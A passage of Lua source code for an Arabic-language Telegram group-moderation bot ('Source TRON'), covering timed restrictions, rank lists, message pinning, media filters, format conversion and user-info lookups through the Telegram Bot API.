https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده لمدة ↫ "..mutept.." س") 
DevAbd:sadd(TRON..'Abd:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده لمدة ↫ "..mutept.." ي") 
DevAbd:sadd(TRON..'Abd:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
--     Source TRON     --
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف رسائل (%d+)$")
DevAbd:set('TRONTEAM:'..TRON..'id:user'..msg.chat_id_,TXT)  
DevAbd:setex('TRONTEAM:'..TRON.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد الرسائل الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Abd(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function Reply(extra, result, success)
DevAbd:del(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevAbd:incrby(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة "..Num..' رساله', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف نقاط (%d+)$")
DevAbd:set('TRONTEAM:'..TRON..'ids:user'..msg.chat_id_,TXT)  
DevAbd:setex('TRONTEAM:'..TRON.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد النقاط الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Abd(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function Reply(extra, result, success)
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevAbd:get(TRON..'Abd:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevAbd:sadd(TRON.."Abd:cleaner"..msg.chat_id_, msg.id_) else DevAbd:sadd(TRON.."Abd:cleaner"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevAbd:sismember(TRON.."Abd:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_Abd(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
DevAbd:set(TRON..'Abd:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تثبيت الرساله بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات', 1, 'md')
return false  
end
end,nil)
end 
end
--     Source TRON     --
if Admin(msg) then
if text == "المميزين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:VipMem:'..msg.chat_id_)
text = "⌁︙قائمة المميزين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد مميزين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source TRON     --
if Manager(msg) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local Abd =  'Abd:Admins:'..msg.chat_id_
local List = DevAbd:smembers(TRON..Abd)
text = "⌁︙قائمة الادمنيه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌁︙*لا يوجد ادمنيه*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     Source TRON     -- 
if Constructor(msg) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:Managers:'..msg.chat_id_)
text = "⌁︙قائمة المدراء ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد مدراء*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنظفين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:Cleaner:'..msg.chat_id_)
text = "⌁︙قائمة المنظفين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد منظفين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source TRON     --
if BasicConstructor(msg) then
if text == "المنشئين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:Constructor:'..msg.chat_id_)
text = "⌁︙قائمة المنشئين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد منشئين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     Source TRON     --
if AbdConstructor(msg) then
if text == "المالكين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:AbdConstructor:'..msg.chat_id_)
text = "⌁︙قائمة المالكين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد مالكين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:BasicConstructor:'..msg.chat_id_)
text = "⌁︙قائمة المنشئين الاساسيين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد منشئين اساسيين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
end 
if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "YYYYAX")
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
end,nil)   
end
end
end,nil)   
end
--     Source TRON     --
if Admin(msg) then
if text == "المكتومين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:Muted:'..msg.chat_id_)
text = "⌁︙قائمة المكتومين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد مكتومين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source TRON     --
if text == "المقيدين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:Tkeed:'..msg.chat_id_)
text = "⌁︙قائمة المقيدين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌁︙*لا يوجد مقيدين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source TRON     --
if text == "المحظورين" and ChCheck(msg) or text == "المحضورين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:Ban:'..msg.chat_id_)
text = "⌁︙قائمة المحظورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد محظورين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "قائمه المنع" and ChCheck(msg) then
local List = DevAbd:hkeys(TRON..'Abd:Filters:'..msg.chat_id_)
text = "⌁︙قائمة المنع ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(List) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
if #List == 0 then
text = "⌁︙لا توجد كلمات ممنوعه"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end 
--     Source TRON     --
if text == "المطايه" and ChCheck(msg) or text == "المطاية" and ChCheck(msg) then
local List = DevAbd:smembers(TRON..'User:Donky:'..msg.chat_id_)
text = "⌁︙قائمة مطاية المجموعه 😹💔 ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌁︙*لا يوجد مطايه كلها اوادم* 😹💔"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source TRON     --
if text == "المطورين الثانويين" and SecondSudo(msg) or text == "الثانويين" and SecondSudo(msg) then 
local List = DevAbd:smembers(TRON..'Abd:SecondSudo:')
text = "⌁︙قائمة المطورين الثانويين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌁︙*عذرا لم يتم رفع اي مطورين ثانويين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source TRON     --
if SudoBot(msg) then
if text == "قائمه العام" and ChCheck(msg) or text == "المحظورين عام" and ChCheck(msg) or text == "المكتومين عام" and ChCheck(msg) or text == "↫ قائمه العام ⌁" and ChCheck(msg) then 
local BanAll = DevAbd:smembers(TRON..'Abd:BanAll:')
local MuteAll = DevAbd:smembers(TRON..'Abd:MuteAll:')
if #BanAll ~= 0 then 
text = "⌁︙قائمة المحظورين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(BanAll) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = ""
end
if #MuteAll ~= 0 then 
text = text.."⌁︙قائمة المكتومين عام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(MuteAll) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
else
text = text
end
if #BanAll ~= 0 or #MuteAll ~= 0 then 
text = text
else
text = "⌁︙*لم يتم حظر او كتم اي عضو*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source TRON     --
if text == "المطورين" and ChCheck(msg) or text == "↫ المطورين ⌁" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:SudoBot:')
text = "⌁︙قائمة المطورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local sudouser = DevAbd:get(TRON..'Abd:Sudos'..v) 
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."] ↬ Gps : "..(sudouser or 0).."\n"
else
text = text..k.."~ : `"..v.."` ↬ Gps : "..(sudouser or 0).."\n"
end end
if #List == 0 then
text = "⌁︙*عذرا لم يتم رفع اي مطورين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source TRON     --
if text == "المدراء العامين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:ManagerAll:')
text = "⌁︙قائمة المدراء العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد مدراء عامين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end
--     Source TRON     --
if text == "المميزين عام" and ChCheck(msg) or text == "المميزين العامين" and ChCheck(msg) then 
local List = DevAbd:smembers(TRON..'Abd:VipAll:')
text = "⌁︙قائمة المميزين العام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then 
text = "⌁︙*لا يوجد مميزين عام*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
--     Source TRON     -- 
if text == "الادمنيه العامين" and ChCheck(msg) then 
local Abd =  'Abd:AdminAll:'
local List = DevAbd:smembers(TRON..Abd)
text = "⌁︙قائمة الادمنيه العامين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(List) do
local username = DevAbd:get(TRON..'Save:UserName'..v)
if username then
text = text..k.."~ : [@"..username.."]\n"
else
text = text..k.."~ : `"..v.."`\n"
end end
if #List == 0 then
text = "⌁︙*لا يوجد ادمنيه عامين*"
end
Dev_Abd(msg.chat_id_, msg.id_, 1, text, 1, "md")
end  
--     Source TRON     --
if text ==("رفع المنشئ") and ChCheck(msg) or text ==("رفع المالك") and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
end
end
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
if dp.first_name_ == false then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙حساب المنشئ محذوف", 1, "md")
return false  
end
local UserName = (dp.username_ or "YYYYAX")
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم رفع مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md") 
DevAbd:sadd(TRON.."Abd:AbdConstructor:"..msg.chat_id_,dp.id_)
end,nil)   
end,nil)   
end
end 
--     Source TRON     --
if Manager(msg) then
if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then 
function filter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevAbd:sadd(TRON.."Abd:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم منع الملصق بنجاح لن يتم ارساله مجددا', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevAbd:sadd(TRON.."Abd:FilterPhoto"..msg.chat_id_,photo)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم منع الصوره بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
if result.content_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevAbd:sadd(TRON.."Abd:FilterAnimation"..msg.chat_id_,idanimation)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم منع المتحركه بنجاح لن يتم ارسالها مجددا', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,filter_by_reply) 
end
--     Source TRON     --
if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and ChCheck(msg) then     
function unfilter_by_reply(extra, result, success) 
if result.content_.sticker_ then
local idsticker = result.content_.sticker_.sticker_.persistent_id_
DevAbd:srem(TRON.."Abd:FilterSteckr"..msg.chat_id_,idsticker)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع الملصق يمكنهم ارساله الان', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
DevAbd:srem(TRON.."Abd:FilterPhoto"..msg.chat_id_,photo)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع الصوره يمكنهم ارسالها الان', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
DevAbd:srem(TRON.."Abd:FilterAnimation"..msg.chat_id_,idanimation)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء منع المتحركه يمكنهم ارسالها الان', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     Source TRON     --
if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل تحويل الصيغ'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Thwel:Abd'..msg.chat_id_) 
end
if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and Manager(msg) and ChCheck(msg) then
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل تحويل الصيغ'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Thwel:Abd'..msg.chat_id_,true)  
end
if text == 'تحويل' and not DevAbd:get(TRON..'Abd:Thwel:Abd'..msg.chat_id_) and SourceCh(msg) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local Abd = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Abd.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local Abd = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Abd.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','⌁︙تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local Abd = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Abd.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"⌁︙تم تحويل الـMp3 الى بصمه")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local Abd = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..Abd.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
--     Source TRON     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..data.id_) or 0)
if DevAbd:sismember(TRON..'Abd:BanAll:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevAbd:sismember(TRON..'Abd:MuteAll:',result.sender_user_id_) then
Tkeed = 'مكتوم عام'
elseif DevAbd:sismember(TRON..'Abd:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevAbd:sismember(TRON..'Abd:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n⌁︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevAbd:sismember(TRON..'Abd:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevAbd:get(TRON..'Abd:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\n⌁︙لقبه ↫ '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⌁︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..result.sender_user_id_..')\n⌁︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n⌁︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ `'..result.sender_user_id_..'` ❩\n⌁︙رتبته ↫ '..IdRank(result.sender_user_id_, msg.chat_id_)..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^كشف @(.*)') and ChCheck(msg) or text and text:match('^ايدي @(.*)') and ChCheck(msg) then 
local username = text:match('^كشف @(.*)') or text:match('^ايدي @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙*المعرف غير صحيح*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'قناة'
local chn = '⌁︙نوع الحساب ↫ ❨ '..ch..' ❩\n⌁︙الايدي ↫ ❨ `'..res.id_..'` ❩\n⌁︙المعرف ↫ ❨ [@'..username..'] ❩\n⌁︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_Abd(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
